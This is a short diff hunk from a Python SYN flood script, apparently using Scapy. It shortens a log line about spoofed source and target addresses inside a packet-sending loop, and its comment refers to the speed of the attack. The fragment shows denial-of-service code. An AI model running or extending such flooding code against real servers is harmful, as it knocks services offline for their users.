@@ -21,7 +21,7 @@ def syn_flood():
 
         # Send the SYN packet
         send(pkt, verbose=False)
-        print(f"[+] Sent SYN packet from {src_ip}:{src_port} to {server_ip}:{server_port}")
+        print("Sent SYN packet from")
 
         # Optional: Adjust speed of attack
         time.sleep(0.01)  # 10ms delay to reduce network saturation (adjust as needed)
